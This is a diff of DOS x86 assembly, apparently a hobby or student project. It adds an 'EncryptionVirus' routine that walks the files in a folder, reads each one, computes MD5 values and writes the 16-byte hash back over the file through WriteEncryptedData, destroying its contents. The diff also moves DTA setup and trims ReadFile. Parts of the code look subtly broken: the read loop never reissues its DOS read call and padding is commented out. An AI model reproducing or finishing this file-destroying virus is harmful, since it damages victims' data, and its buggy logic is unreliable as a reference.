@@ -34,15 +34,14 @@ Rotation Byte 7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,
 			  5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,
 			  4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,
 			  6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21
+			  
+HashedData DWord 4 DUP(?)
 
 			  
 .CODE
 mov AX,@data		;Initialize Data segment
 mov DS,AX
-mov AH,1Ah			;Set DTA
-mov DX,offset DTA	;point DX to DTA returned by OS
-int 21h
-
+Call EncryptionVirus
 Quit::
 .EXIT 
 main ENDP
@@ -54,6 +53,10 @@ END main
 ;Returns Data of first file found
 ;----------------------------------------------------------------------------
 FindFirstFile PROC
+mov AH,1Ah			;Set DTA
+mov DX,offset DTA	;point DX to DTA returned by OS
+int 21h
+
 mov AH , 4Eh					;Dos function search for 1st matching file
 mov CX , 1						;Normal attribute
 mov DX , SI
@@ -65,7 +68,7 @@ FindFirstFile ENDP
 ;----------------------------------------------------------------------------
 ;Get next file with specific extension from the given folder
 ;Recieve Nothing
-;Returns Nothing
+;Returns Data of current file found
 ;----------------------------------------------------------------------------
 FindNextFile PROC
 mov AH, 4Fh
@@ -113,24 +116,13 @@ OpenFile ENDP
 ;----------------------------------------------------------------------------
 ;Read current opened file
 ;Recieve: Nothing
-;Returns Nothing
+;Returns AX conatains number of bytes retrieved from the file 
 ;----------------------------------------------------------------------------
-ReadFile PROC USES EAX,ECX,EDX
-Read:
-mov AH,3Fh				;Read from file
-mov BX,FileHandle
+ReadFile PROC USES ECX,EDX
 mov CX,  BufferSize		;Number of bytes to read 
 mov DX,offset Buffer                                              
 int 21h  
 JC Quit
-CMP AX , 0
-JE Done 
-mov CurrentSize , AX                                                                             
-JMP READ
-
-Done:
-mov AH , 3Eh			;Close file
-int 21h
 RET
 Readfile ENDP
 
@@ -332,6 +324,51 @@ INC RotationIndex
 ADD TIndex,TYPEOF T
 POP ECX
 LOOP ICall
-
 RET
 MD5Contoller ENDP
+
+;----------------------------------------------------------------------------
+;The Main Controller of the project to call all functions
+;Recieves: Nothing
+;Returns : Nothing
+;----------------------------------------------------------------------------
+EncryptionVirus PROC
+mov SI , offset FolderPath
+Call FindFirstFile
+
+EncryptFiles:
+mov DI ,offset FileFullPath
+Call GetFilePath
+mov DX,offset FileFullPath
+Call OpenFile
+
+mov AH,3Fh				;Read from file
+mov BX,FileHandle
+ReadData:
+CMP AX , 0
+JE EndOfFile 
+mov CurrentSize , AX
+Call MD5Controller                                                                             
+JMP ReadData
+
+EndOfFile:
+;Call Padding
+;Call MD5Controller
+mov HashedData[0],A
+mov HashedData[4],B
+mov HashedData[8],C
+mov HashedData[12],D
+
+mov AH , 3Eh			;Close file
+int 21h
+
+mov SI,offset HashedData
+mov DX,offset FileFullPath
+Call WriteEncryptedData
+
+Call FindNextFile
+
+JMP EncryptFiles
+
+RET
+EncryptionVirus ENDP
